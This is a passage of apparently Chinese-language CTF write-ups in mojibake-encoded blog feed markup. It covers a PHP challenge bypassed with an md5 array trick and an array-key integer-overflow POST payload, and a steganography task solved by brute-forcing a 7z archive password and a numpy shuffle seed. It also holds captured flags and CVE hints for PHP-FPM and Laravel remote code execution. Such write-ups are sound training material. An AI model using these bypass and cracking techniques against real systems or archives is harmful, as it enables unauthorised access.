è§£å‹ï¼Œå¾—åˆ° flagã€‚</p><p><code>flag{ez_di_imp_1t_y0u_like?}</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210602163757049.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><blockquote><p>ç­¾åˆ°é¢˜ </p><p>é¢˜ç›®åœ°å€ï¼š<a href="http://47.106.172.29:22221/">http://47.106.172.29:22221/</a> </p><p>hint:è¿™ä¸ªå›¾ç‰‡çœŸå¥½çœ‹å‘€ï¼Œæ²¡å•¥éšè—çš„ä¸œè¥¿å§</p></blockquote><p>å†ä¹Ÿä¸ä¿¡ä½ ä»¬ä»€ä¹ˆç­¾åˆ°é¢˜äº†ï¼ï¼ï¼</p><p>å…ˆæŠŠèƒŒæ™¯å›¾ä¸‹è½½ä¸‹æ¥å§ã€‚</p><p><img src="/2021/06/18/CTF_2021NewsCTF0601/backImg.png" alt="backImg"></p><p>æå–å‡ºæ¥ä¸ª zip</p><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210603011117444.png"></p><p>å¥½å®¶ä¼™ï¼Œçœ‹æ¥ç½‘é¡µä¸Šåˆæœ‰å‡çš„ flagã€‚åŸæ¥æ˜¯ Misc + Web å•Šã€‚</p><p>ç½‘é¡µä¸Šç»™äº†æºç ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>EasyWeb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">            <span class="token selector">html, body</span> <span class="token punctuation">{</span>                <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>                <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>                <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token selector">body</span> <span class="token punctuation">{</span>                <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>backImg.jpg<span class="token punctuation">)</span></span><span class="token punctuation">;</span>                <span class="token property">background-size</span><span class="token punctuation">:</span> contain<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token selector">.content</span> <span class="token punctuation">{</span>                <span class="token property">width</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span>                <span class="token property">text-align</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>                <span class="token property">padding</span> <span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>                <span class="token property">margin</span><span class="token punctuation">:</span> 0 auto<span class="token punctuation">;</span>                <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgb</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 0.7<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>EasyWeb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token delimiter important">?&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>            <span class="token variable">$six_number</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'webp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$six_number</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'e10adc3949ba59abbe56e057f20f883e'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$c</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span><span class="token punctuation">{</span>                        <span class="token keyword">require_once</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>         <span class="token delimiter important">?&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>md5 <code>e10adc3949ba59abbe56e057f20f883e</code> å¯¹åº”çš„æ˜æ–‡æ˜¯ <code>123456</code>ï¼Œmd5 ç›¸åŒè€Œå†…å®¹ä¸åŒçš„è¯å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œå³ <code>a[]=1&amp;b[]=2</code>.</p><p>ç„¶è€Œè¿™ä¸ª <code>if($array[]=1)</code> æ€ä¹ˆç»•è¿‡ï¼Œå’±ä¸¤å¤©é‡Œæ–­æ–­ç»­ç»­æƒ³ç€ä¹Ÿæ²¡æƒ³å‡ºæ¥â€¦â€¦</p><p>æœ€åæ¯”èµ›ç»“æŸäº†æ‰çŸ¥é“æ˜¯æ•°ç»„ Key <strong>æ•´æ•°æº¢å‡º</strong>ã€‚</p><p>åœ¨ php ä¸­ä¸€ä¸ª array åŒ…å«é”® key å’Œå€¼ valueï¼Œ<strong>å½“ç»™ä¸€ä¸ªæœªæŒ‡å®š key çš„ array èµ‹å€¼æ—¶ï¼Œä¼šè‡ªåŠ¨ç»™å½“å‰ key èµ‹å€¼ä¸ºä¸Šä¸€ä¸ªä½¿ç”¨è¿‡çš„ æ•´æ•° key +1ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰</strong>ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨è¿‡çš„è¯åˆ™ä¸º 0.</p><p>å‡å¦‚ä¹‹å‰çš„ key æ˜¯ä¸ªå­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œé‚£æ–°çš„ä¸‹æ ‡ä¹Ÿå°±æ˜¯ 0.</p><p>å¦å¤– php çš„ <code>++</code> é™¤äº†ä¼šç»™æ•´æ•° +1 å¤–ï¼Œè¿˜å¯ä»¥ç»™å­—ç¬¦ +1ï¼Œå€’æ˜¯å­—ç¬¦çš„ ++ æœ‰äº¿ç‚¹æ€ªï¼Œæ¯”å¦‚ <code>z</code>-&gt; <code>aa</code>, <code>Z</code> -&gt; <code>AA</code>, <code>1Z</code> -&gt; <code>2A</code>, <code>Zaf</code> -&gt; <code>Zag</code>, <code>3adAZ</code> -&gt; <code>3adBA</code>, etc.</p><p>è¿™é‡Œå°±ä¸ç ”ç©¶äº†ï¼Œä¹Ÿä¸æ˜¯è¿™é¢˜å…³é”®ï¼ˆå–µå–µæ‡µäº†ï¼Œæ„Ÿè§‰å¾—çœ‹åº•å±‚æºç æ‰çŸ¥é“</p><p>è€Œè¿™é‡Œçš„æœ€å¤§è¡¨ç¤ºæ•°æ˜¯ 2**63-1ï¼Œå³ 9223372036854775807ï¼Œç„¶åå› ä¸º <code>if($array[++$c]=1)</code> åšäº†è‡ªå¢å¤„ç†ï¼Œå’±æŠŠ <code>c</code> è®¾ä¸º 9223372036854775806ï¼Œå½“ <code>if($array[]=1)</code> èµ‹å€¼çš„æ—¶å€™å°±ä¼šé€ æˆæº¢å‡ºï¼ŒæŠ¥é”™ä¸”åˆ¤æ–­ä¸ä¸ºçœŸï¼Œä»è€Œèƒ½å¤Ÿæ‹¿åˆ° <code>$flag</code>.</p><p><em>ï¼ˆæ„Ÿè§‰è¯´çš„å¥½ä¹±å•Šï¼Œéšæ„çœ‹çœ‹å°±å¥½äº†</em></p><p>äºæ˜¯ Payloadï¼š</p><pre class="language-none"><code class="language-none">webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code></pre><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210603011603035.png"></p><p>ä½ çœ‹ä»–è¿™é‡ŒæŠ¥çš„é”™å°±æ˜¯ ç”±äºä¸‹ä¸€ä¸ªå…ƒç´ è¢«å ç”¨è€Œä¸èƒ½å°†å…¶æ·»åŠ åˆ° array ä¸­ã€‚</p><pre class="language-none"><code class="language-none">password: xluoyyds123456@@@ </code></pre><p>æ‹¿å»è§£å‹å¾—åˆ°æœ€ç»ˆçš„ flagã€‚</p><p><code>newsctf{this_1s_veryveryveryeasyweb}</code></p><blockquote><p>å»æœäº†ä¸€ä¸‹</p><p>stackoverflow: <a href="https://stackoverflow.com/questions/18286066/next-element-is-already-occupied-error">â€œnext element is already occupiedâ€ error</a></p><p>å…¶å®è¿™é¢˜çš„ <code>c</code> å°±æ˜¯èµ‹å€¼ä¸º <code>PHP_INT_MAX -1</code>. </p><p>ç›¸å½“äºåœ¨ PHP é‡Œä¸€ä¸ª array æœ€å¤šèƒ½å¤Ÿè¡¨ç¤ºçš„å…ƒç´ ä¸ªæ•°å°±æ˜¯ <code>PHP_INT_MAX </code> äº†ã€‚</p><p>ç„¶ååˆå‘ç°ï¼Œåœ¨å»å¹´å‘å¸ƒçš„ PHP8 é‡Œï¼Œè¿™ä¸ª <a href="https://stitcher.io/blog/new-in-php-8">æŠ›å‡ºå¼‚å¸¸å˜æˆ Error äº†</a>ï¼</p><p>ï¼ˆå®‰å…¨æ€§æå‡++</p><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210603020302485.png"></p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å…¶ä»–æœ‰çš„é¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚</p><p>å°±å…ˆè¿™æ ·å§ï¼ˆæ‘Šæ‰‹ç¡å¤§è§‰</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p><!--![](CTF_2021NewsCTF0601/image-20210602183934551.png)`flag{this_fake_flag_is_put_here_just_for_fun}`ä¸å¯¹### impossible ip> é¢˜ç›®åœ°å€ï¼šhttp://120.79.25.56:5778/>> Hint: php-fpmæ‰“ SSRF å•Š[PHP-FPM è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-11043ï¼‰](https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md) docker å¤ç°ç¯å¢ƒ### shorturl> é¢˜ç›®åœ°å€ï¼šhttp://103.45.131.26:22223/>> Hint: Laravel Debugæ¨¡å¼ä¸‹è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åŸç†CVE-2021-3129 å•Šã€‚-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 æ˜¥ç§‹æ¯ Baby_steg WriteUp</title>
      <link href="2021/05/31/CTF_2021chunqiu_Baby_steg/"/>
      <url>2021/05/31/CTF_2021chunqiu_Baby_steg/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/image-20210530191538770.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>2021å¹´ æ˜¥ç§‹æ¯ ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ›</strong></p><p>æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ29æ—¥ 10:00-18:00</p><p><a href="https://www.ichunqiu.com/chunqiucup">https://www.ichunqiu.com/chunqiucup</a></p></blockquote><p>å’Œä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œè¿™å‘¨æœ«æ¯”èµ›å·¨å¤šã€‚</p><p>äºæ˜¯æ˜¥ç§‹æ¯çš„è¯ä¹Ÿæ˜¯éšæ„çœ‹äº†é¢˜ï¼Œç„¶è€Œå‘ç°é¢˜ç›®æŒºéš¾çš„ Orzã€‚</p><p>è¿™ä¸ªæ¯”èµ›çš„æ—¶å€™å°±æ‘¸é±¼åšäº† Misc Baby_steg é¢˜ç›®çš„ä¸€åŠï¼Œå‰©ä¸‹ä¸€åŠè¿˜æ˜¯æ¯”èµ›åå¤ç°çš„ã€‚å…¶ä»–é¢˜ç›®å°±æ²¡æ€ä¹ˆçœ‹å§ã€‚</p><p>è¿™é¢˜ç»“åˆäº†å‡ ä¸ªä¹‹å‰æ²¡è§è¿‡çš„ç©æ³•ï¼Œè¿™é‡Œé¡ºæ‰‹è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="Baby-steg"><a href="#Baby-steg" class="headerlink" title="Baby_steg"></a>Baby_steg</h2><blockquote><p>å°Aæƒ³å­¦MISCï¼Œå¥¹è¯·æ•™äº†æŸå¤§ä½¬ï¼Œå¤§ä½¬ä¸ºäº†è€ƒéªŒå¥¹çš„èƒ½åŠ›ï¼Œç»™äº†å¥¹ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©å¥¹æ‰¾åˆ°å…¶ä¸­éšè—çš„ç§˜å¯†ï¼Œå¯æ˜¯å°Aæ‹¿åˆ°æ–‡ä»¶åä¸€è„¸æ‡µé€¼ï¼Œæ‰€ä»¥æ¥æ‰¾ä½ æ±‚æ•‘ï¼Œä½ èƒ½å¸®åŠ©å¥¹å—?</p><p><a href="https://pan.baidu.com/s/1DBf1da8B8QHX2OCMfwMmJA">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/u8J5wOMQ">å¤‡ç”¨ä¸‹è½½</a></p><p>hint:å…ˆè·å–password.7zé‡Œé¢çš„å†…å®¹ï¼Œå¤§ä½¬å¥½åƒè·Ÿå°Aè¯´æ˜¯6-8ä½çš„æ•°å­—</p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸ªå‹ç¼©åŒ…ã€‚</p><p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/image-20210529182500254.png"></p><p>æ ¹æ®æç¤ºéœ€è¦å…ˆè§£å¯†é‚£ä¸ª 7zã€‚</p><p>æœäº†ä¸€ä¸‹å‘ç° cRARk for 7-Zip ç”¨æ¥çˆ†ç ´è¿˜æŒºä¸é”™ï¼Œæ”¯æŒè‡ªå®šä¹‰å„ç§æ ¼å¼çš„å¯†ç ï¼Œè¿˜èƒ½è°ƒç”¨ GPU åŠ é€Ÿè¿ç®—ã€‚</p><p>åœ¨ <a href="https://www.crark.net/crark-7zip.html">https://www.crark.net/crark-7zip.html</a> è¿™é‡Œä¸‹è½½ã€‚</p><p>å‚è€ƒ <a href="https://www.crark.net/cRARk-7z.html">https://www.crark.net/cRARk-7z.html</a> å†™ <code>password.def</code> å®šä¹‰æ–‡ä»¶ã€‚</p><p>ç”±äºå…¨æ˜¯æ•°å­—ï¼Œç›´æ¥å°±å†™æˆè¿™æ ·ã€‚</p><pre class="language-none"><code class="language-none">##$1 *</code></pre><p>ç„¶åæŒ‡å®šæœ€å°å’Œæœ€å¤§çš„é•¿åº¦å»è§£å¯†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">crark-7z.exe -l6 -g8 password.7z</code></pre><p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/image-20210529175232631.png"></p><p>å¾—åˆ° 7z çš„å¯†ç  <code>321456</code></p><p>è§£å‹å‡ºæ¥ä¸ª <code>password.txt</code></p><pre class="language-none"><code class="language-none">7324623c</code></pre><p><code>flag1.txt</code> è¿™æ˜¯ä»€ä¹ˆç©æ„â€¦â€¦</p><p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/image-20210529182615012.png"></p><p>åæ¥çœ‹äº†åˆ«äºº wp æ‰å‘ç°æ˜¯ uuencodeã€‚æ¥å¤ç°ä¸€ä¸‹ã€‚</p><p>æ‹¿ python å†™ä¸ªè„šæœ¬è§£ç ä¸€ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uus <span class="token operator">=</span> uu<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'flag1.txt'</span><span class="token punctuation">)</span></code></pre><p>å®ƒä¼šè‡ªåŠ¨è¾“å‡ºæ–‡ä»¶ã€‚</p><blockquote><p>åŠ å¯†çš„è¯å°±æ˜¯</p><pre class="language-none"><code class="language-none">uu.encode(input_file, output_file)</code></pre><p>ç”¨ä¸Šé¢è§£å¯†å¾—åˆ°çš„ <code>7324623c</code> ä½œä¸ºå¯†ç è§£å‹ã€‚</p></blockquote><p>å¾—åˆ°ä¸€å¼ å›¾ <code>challenge.png</code></p><p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/challenge.png" alt="challenge"></p><p>ä»¥åŠ <code>encode.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> cv2<span class="token keyword">import</span> sys<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">,</span><span class="token number">540</span><span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment"># image = 1298 * 695</span>    to_hide <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>image<span class="token punctuation">)</span>    to_hide_array <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>to_hide<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>to_hide_array<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>to_hide_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        gray <span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>to_hide_array<span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>COLOR_BGR2GRAY<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'challenge.png'</span><span class="token punctuation">,</span> gray<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"encode!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    encode<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>éšæœºæ•°ç§å­åœ¨ 520-540 ä¹‹å‰å–å€¼ï¼Œ<code>np.random.shuffle</code> å‡½æ•°æŠŠ <code>to_hide_array</code> ç¬¬1ä¸ªç»´åº¦ä¸Šçš„æ•°å­—è¿›è¡Œä½ç½®ä¸Šçš„éšæœºæ‰“ä¹±ã€‚</p><p>äºæ˜¯å¯ä»¥è¯•è¯•çˆ†ç ´è¿™ä¸ªéšæœºæ•°ç§å­ï¼Œè®°å½•ä¸‹æ‰“ä¹±å‰åä¸‹æ ‡çš„æ˜ å°„å…³ç³»ï¼Œå†åè¿‡æ¥æ¢å¤å‡ºåŸå§‹å›¾åƒï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯æ‰“ä¹±ä¹‹å‰çš„å›¾åƒäº†ã€‚</p><p>å¦å¤–æ³¨æ„ <code>random.randint(520,540)</code> åœ¨ 520 å’Œ 540 ä¸Šéƒ½èƒ½å–åˆ°å€¼ï¼Œå³å·¦å³åŒºé—´éƒ½é—­åˆã€‚ </p><p>ä»£ç å†™çš„æœ‰ç‚¹ä¹±ï¼Œèƒ½ç”¨å°±è¡Œäº†ã€‚<em>ï¼ˆé€ƒèµ°</em></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> cv2<span class="token keyword">import</span> sys<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># image = 1298 * 695</span>    to_hide <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>image<span class="token punctuation">)</span>    to_hide_array <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>to_hide<span class="token punctuation">)</span>    shape <span class="token operator">=</span> to_hide_array<span class="token punctuation">.</span>shape    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'====&gt;'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        l1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            l2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            new_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>l2<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                new_array<span class="token punctuation">.</span>append<span class="token punctuation">(</span>to_hide_array<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>l2<span class="token punctuation">.</span>index<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_array<span class="token punctuation">)</span>        l1_array <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>l1<span class="token punctuation">)</span>        <span class="token comment"># gray = cv2.cvtColor(l1_array, cv2.COLOR_BGR2GRAY)</span>        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'decode</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">,</span> l1_array<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    decode<span class="token punctuation">(</span><span class="token string">'challenge.png'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ€åè·‘å‡ºæ¥æ˜¯éšæœºç§å­ä¸º 540 æ—¶å€™çš„æƒ…å†µï¼Œå¾—å‡º flagã€‚</p><p><img src="/2021/05/31/CTF_2021chunqiu_Baby_steg/decode540.png" alt="decode540"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>Baby_steg è¿™é¢˜è¿˜æ˜¯å †äº†å‡ ä¸ªæ²¡ç©è¿‡çš„çŸ¥è¯†ç‚¹çš„ï¼Œæ­£å¥½è¿˜æŠŠ 7z å‹ç¼©åŒ…çˆ†ç ´çš„å·¥å…·ä¹Ÿæ‰¾äº†ä¸€æ³¢ï¼ŒcRARk for 7-Zip è¿˜æ˜¯æŒºé¦™çš„ï¼</p><p>é¡ºä¾¿è¿˜å‘ç°äº† python é‡Œçš„ <code>uu</code> å°±èƒ½ç›´æ¥è¿›è¡Œ uuencode ç¼–è§£ç ï¼Œå¥½è€¶ã€‚</p><p>å°±è¿™æ ·å§ï¼Œæ‘¸ğŸŸå¤§æ³•å¥½ï¼</p><p>BTWï¼ŒXCTF final 